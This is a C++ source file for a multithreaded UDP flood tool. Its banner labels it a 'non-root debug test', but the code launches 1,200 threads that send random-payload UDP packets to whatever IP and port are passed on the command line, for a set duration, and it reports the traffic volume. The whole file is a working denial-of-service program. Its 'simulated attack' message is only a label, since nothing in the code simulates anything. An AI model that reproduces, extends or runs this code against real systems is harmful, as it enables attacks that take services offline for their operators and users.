
#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <csignal>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define THREAD_COUNT 1200
#define FAKE_ERROR_DELAY 677
#define REPORT_INTERVAL 5 // in seconds

#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define CYAN    "\033[1;36m"
#define YELLOW  "\033[1;33m"
#define RESET   "\033[0m"
#define MAGENTA "\033[1;35m"

bool keepSending = true;
bool keepReceiving = true;
uint64_t totalPacketsSent = 0;
uint64_t totalDataSent = 0;
std::mutex statsMutex;

void signalHandler(int signum) {
    keepSending = false;
}

void showBanner() {
    std::cout << MAGENTA << R"(
==========================================================
   DEBUG NON-ROOT UDP FLOOD TEST — ROHAN & SADIQ
   Works without sudo — Packet flow monitor enabled
==========================================================
)" << RESET;
}

void sendFlood(const char* ip, int port, int duration, int packetSize, int threadId) {
    int udpSocket = socket(AF_INET, SOCK_DGRAM, 0);
    if (udpSocket < 0) return;

    struct sockaddr_in target{};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);

    char* packet = new char[packetSize];
    for (int i = 0; i < packetSize; ++i)
        packet[i] = rand() % 256;

    auto endTime = std::chrono::steady_clock::now() + std::chrono::seconds(duration);

    if (threadId == 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds(FAKE_ERROR_DELAY));
        std::cout << RED << "SIMULATED ATTACK STARTED (NON-ROOT MODE)" << RESET << std::endl;
    }

    while (keepSending && std::chrono::steady_clock::now() < endTime) {
        ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0, (struct sockaddr*)&target, sizeof(target));
        if (bytesSent > 0) {
            std::lock_guard<std::mutex> lock(statsMutex);
            totalPacketsSent++;
            totalDataSent += bytesSent;
        }
    }

    close(udpSocket);
    delete[] packet;
}

void liveReporter() {
    using namespace std::chrono_literals;
    while (keepSending) {
        std::this_thread::sleep_for(std::chrono::seconds(REPORT_INTERVAL));
        std::lock_guard<std::mutex> lock(statsMutex);
        std::cout << CYAN << "[*] Live Packets Sent: " << totalPacketsSent
                  << " | Data: " << (totalDataSent / (1024.0 * 1024.0)) << " MB" << RESET << std::endl;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cout << RED << "Usage:\n  " << argv[0] << " <IP> <Port> <Duration> <PacketSize>\n" << RESET;
        return 1;
    }

    const char* ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int packetSize = std::atoi(argv[4]);

    signal(SIGINT, signalHandler);
    showBanner();

    std::cout << CYAN "━━━━━━━━━━━━━━━━━━━" RESET << std::endl;
    std::cout << GREEN " Target      " RESET << " : " << ip << ":" << port << std::endl;
    std::cout << GREEN " Mode        " RESET << " : NON-ROOT DEBUG\n";
    std::cout << GREEN " Duration    " RESET << " : " << duration << " sec\n";
    std::cout << GREEN " Threads     " RESET << " : " << THREAD_COUNT << "\n";
    std::cout << GREEN " Packet Size " RESET << " : " << packetSize << " bytes\n";
    std::cout << CYAN "━━━━━━━━━━━━━━━━━━━" RESET << std::endl;

    std::thread reporterThread(liveReporter);
    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(sendFlood, ip, port, duration, packetSize, i);
    }

    for (auto& t : threads) t.join();
    keepSending = false;
    reporterThread.join();

    std::cout << "\n" GREEN "========== FINAL REPORT ==========" RESET << "\n";
    std::cout << CYAN << "[+] Packets Sent : " << totalPacketsSent << "\n";
    std::cout << "[+] Data Sent    : " << std::fixed << std::setprecision(2) << (totalDataSent / (1024.0 * 1024.0)) << " MB\n";
    std::cout << MAGENTA << "\nTest Complete — Non-root UDP test done.\n" << RESET;

    return 0;
}
